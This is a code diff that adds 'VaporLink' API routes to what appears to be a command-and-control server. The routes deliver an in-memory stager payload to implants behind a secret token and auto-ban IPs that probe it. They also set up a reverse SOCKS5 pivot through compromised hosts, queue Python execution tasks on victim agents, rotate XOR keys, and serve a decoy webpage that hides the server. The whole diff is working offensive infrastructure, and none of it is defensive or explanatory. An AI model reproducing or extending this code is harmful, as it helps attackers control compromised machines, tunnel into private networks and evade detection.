@@ -2684,4 +2684,249 @@ result = "UAC loop started"
         files = [f for f in os.listdir(arsenal_dir) if os.path.isfile(os.path.join(arsenal_dir, f))]
         return jsonify({'status': 'success', 'files': files})
 
+    # ================================================================
+    # VaporLink Stealth SOCKS5 Pivot API Endpoints
+    # ================================================================
+    from glycon.vaporlink import VAPORLINK_MANAGER
+    import hmac
+
+    @app.route('/api/vaporlink/stage', methods=['GET'])
+    def vaporlink_http_stage():
+        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        if client_ip and ',' in client_ip:
+            client_ip = client_ip.split(',')[0].strip()
+
+        if VAPORLINK_MANAGER.is_ip_banned(client_ip):
+            return abort(403)
+
+        client_token = request.headers.get('X-Vapor-Token', '')
+        auth_token = VAPORLINK_MANAGER.config.get('conn_token', '')
+        if not client_token or not auth_token or not hmac.compare_digest(client_token, auth_token):
+            VAPORLINK_MANAGER.failed_attempts[client_ip] = VAPORLINK_MANAGER.failed_attempts.get(client_ip, 0) + 1
+            if VAPORLINK_MANAGER.failed_attempts[client_ip] >= 3:
+                VAPORLINK_MANAGER.ban_ip(client_ip, "Auto-ban: 3 failed stager token attempts")
+            return abort(404)
+
+        VAPORLINK_MANAGER.failed_attempts[client_ip] = 0
+        insecure = request.headers.get('X-Vapor-SSL', '0') == '0'
+        body = VAPORLINK_MANAGER.build_agent_script(insecure=insecure)
+        VAPORLINK_MANAGER.log("STAGER", f"Delivered in-memory payload via C2 /api/vaporlink/stage to {client_ip}")
+        return app.response_class(body, mimetype='text/plain', headers={'Cache-Control': 'no-store'})
+
+    @app.route('/api/vaporlink/status', methods=['GET'])
+    @login_required
+    def vaporlink_status():
+        insecure = request.args.get('insecure', '1') != '0'
+        return jsonify({
+            'status': 'success',
+            'data': VAPORLINK_MANAGER.get_status(insecure_preview=insecure)
+        })
+
+    @app.route('/api/vaporlink/config', methods=['POST'])
+    @login_required
+    def vaporlink_update_config():
+        try:
+            data = request.get_json() or {}
+            updates = {}
+
+            if 'ws_link' in data and data['ws_link']:
+                clean_link = str(data['ws_link']).strip()
+                for prefix in ('https://', 'http://', 'wss://', 'ws://'):
+                    if clean_link.startswith(prefix):
+                        clean_link = clean_link[len(prefix):]
+                updates['ws_link'] = clean_link
+
+            if 'ws_ip' in data and data['ws_ip']:
+                updates['ws_ip'] = str(data['ws_ip']).strip()
+
+            if 'ws_port' in data:
+                ws_port = int(data['ws_port'])
+                if not (1 <= ws_port <= 65535):
+                    return jsonify({'status': 'error', 'message': 'Invalid WS port (1-65535)'}), 400
+                updates['ws_port'] = str(ws_port)
+
+            if 'socks_ip' in data and data['socks_ip']:
+                updates['socks_ip'] = str(data['socks_ip']).strip()
+
+            if 'socks_port' in data:
+                socks_port = int(data['socks_port'])
+                if not (1 <= socks_port <= 65535):
+                    return jsonify({'status': 'error', 'message': 'Invalid SOCKS5 port (1-65535)'}), 400
+                updates['socks_port'] = str(socks_port)
+
+            if 'web_server' in data:
+                updates['web_server'] = 'on' if bool(data['web_server']) else 'off'
+
+            if 'tls_enabled' in data:
+                updates['tls_enabled'] = 'on' if bool(data['tls_enabled']) else 'off'
+
+            if 'mode' in data:
+                if data['mode'] == 'standalone-https':
+                    updates['tls_enabled'] = 'on'
+                    updates['ws_ip'] = data.get('ws_ip', '0.0.0.0')
+                elif data['mode'] == 'proxy-mode':
+                    updates['tls_enabled'] = 'off'
+                    updates['ws_ip'] = data.get('ws_ip', '127.0.0.1')
+
+            VAPORLINK_MANAGER.save_config(updates)
+            VAPORLINK_MANAGER.restart_listeners()
+            return jsonify({
+                'status': 'success',
+                'message': 'VaporLink configuration updated and listeners reloaded',
+                'data': VAPORLINK_MANAGER.get_status(insecure_preview=True)
+            })
+        except Exception as e:
+            return jsonify({'status': 'error', 'message': str(e)}), 500
+
+    @app.route('/api/vaporlink/genkey', methods=['POST'])
+    @login_required
+    def vaporlink_genkey():
+        try:
+            VAPORLINK_MANAGER.rotate_keys()
+            return jsonify({
+                'status': 'success',
+                'message': 'Rotated 16-byte XOR key and 32-byte Connection Token',
+                'data': VAPORLINK_MANAGER.get_status(insecure_preview=True)
+            })
+        except Exception as e:
+            return jsonify({'status': 'error', 'message': str(e)}), 500
+
+    @app.route('/api/vaporlink/session/primary', methods=['POST'])
+    @login_required
+    def vaporlink_set_primary():
+        data = request.get_json() or {}
+        session_id = data.get('session_id', '').strip()
+        if not session_id:
+            return jsonify({'status': 'error', 'message': 'session_id is required'}), 400
+        if VAPORLINK_MANAGER.set_primary_session(session_id):
+            return jsonify({
+                'status': 'success',
+                'message': f'Primary SOCKS5 proxy routed to session {session_id}',
+                'data': VAPORLINK_MANAGER.get_status(insecure_preview=True)
+            })
+        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
+
+    @app.route('/api/vaporlink/session/kick', methods=['POST'])
+    @login_required
+    def vaporlink_kick_session():
+        data = request.get_json() or {}
+        session_id = data.get('session_id', '').strip()
+        if not session_id:
+            return jsonify({'status': 'error', 'message': 'session_id is required'}), 400
+        if VAPORLINK_MANAGER.kick_session(session_id):
+            return jsonify({
+                'status': 'success',
+                'message': f'Terminated session {session_id}',
+                'data': VAPORLINK_MANAGER.get_status(insecure_preview=True)
+            })
+        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
+
+    @app.route('/api/vaporlink/agent/<string:agent_id>/control', methods=['POST'])
+    @login_required
+    def vaporlink_agent_control(agent_id):
+        try:
+            data = request.get_json() or {}
+            action = data.get('action', 'start').lower()
+            if action not in ('start', 'stop'):
+                return jsonify({'status': 'error', 'message': 'Invalid action (use start or stop)'}), 400
+
+            if action == 'stop':
+                # Also immediately disconnect any active server-side session for this agent
+                for sid, sess in list(VAPORLINK_MANAGER.sessions.items()):
+                    if sess.agent_id == agent_id:
+                        VAPORLINK_MANAGER.kick_session(sid)
+
+            python_code = VAPORLINK_MANAGER.build_agent_memory_task(action=action, agent_id=agent_id)
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            c.execute("SELECT hostname FROM agents WHERE id = ?", (agent_id,))
+            row = c.fetchone()
+            if not row:
+                conn.close()
+                return jsonify({'status': 'error', 'message': 'Agent not found'}), 404
+            hostname = row[0]
+
+            c.execute(
+                '''INSERT INTO tasks (agent_id, task_type, task_data, status, created_at)
+                   VALUES (?, ?, ?, 'pending', ?)''',
+                (agent_id, 'execute_python', json.dumps({'code': python_code}), datetime.now().isoformat())
+            )
+            task_id = c.lastrowid
+            conn.commit()
+            conn.close()
+
+            VAPORLINK_MANAGER.log(
+                "INFO",
+                f"Queued VaporLink reverse SOCKS5 {action.upper()} task (#{task_id}) for agent {hostname} ({agent_id})"
+            )
+            return jsonify({
+                'status': 'success',
+                'task_id': task_id,
+                'message': f'Queued VaporLink SOCKS5 {action} task for {hostname}'
+            })
+        except Exception as e:
+            return jsonify({'status': 'error', 'message': str(e)}), 500
+
+    @app.route('/api/vaporlink/ban', methods=['POST'])
+    @login_required
+    def vaporlink_ban_ip():
+        data = request.get_json() or {}
+        ip = str(data.get('ip', '')).strip()
+        reason = str(data.get('reason', 'Manual operator ban')).strip()
+        if not ip:
+            return jsonify({'status': 'error', 'message': 'IP address is required'}), 400
+        try:
+            ipaddress.ip_address(ip)
+        except ValueError:
+            return jsonify({'status': 'error', 'message': 'Invalid IP address format'}), 400
+
+        VAPORLINK_MANAGER.ban_ip(ip, reason)
+        return jsonify({
+            'status': 'success',
+            'message': f'Banned IP {ip}',
+            'banned_ips': VAPORLINK_MANAGER.get_banned_ips()
+        })
+
+    @app.route('/api/vaporlink/ban/<path:ip>', methods=['DELETE'])
+    @login_required
+    def vaporlink_unban_ip(ip):
+        VAPORLINK_MANAGER.unban_ip(ip)
+        return jsonify({
+            'status': 'success',
+            'message': f'Allowed IP {ip}',
+            'banned_ips': VAPORLINK_MANAGER.get_banned_ips()
+        })
+
+    @app.route('/api/vaporlink/logs/clear', methods=['POST'])
+    @login_required
+    def vaporlink_clear_logs():
+        VAPORLINK_MANAGER.logs.clear()
+        VAPORLINK_MANAGER.log("INFO", "Log console cleared by operator.")
+        return jsonify({'status': 'success'})
+
+    @app.route('/vaporlink/decoy', methods=['GET'])
+    def vaporlink_decoy_page():
+        if not VAPORLINK_MANAGER.config.get('web_server', True):
+            return abort(404)
+        html = VAPORLINK_MANAGER.get_decoy_html()
+        return app.response_class(html, mimetype='text/html')
+
+    @app.route('/api/vaporlink/decoy', methods=['GET', 'POST'])
+    @login_required
+    def vaporlink_decoy_config():
+        if request.method == 'GET':
+            return jsonify({
+                'status': 'success',
+                'html': VAPORLINK_MANAGER.get_decoy_html()
+            })
+        data = request.get_json() or {}
+        reset_default = bool(data.get('reset', False))
+        html_content = str(data.get('html', ''))
+        updated = VAPORLINK_MANAGER.save_decoy_html(html_content, reset_default=reset_default)
+        return jsonify({
+            'status': 'success',
+            'message': 'Decoy webpage reset to default' if reset_default else 'Decoy webpage saved',
+            'html': updated
+        })
+
     return app
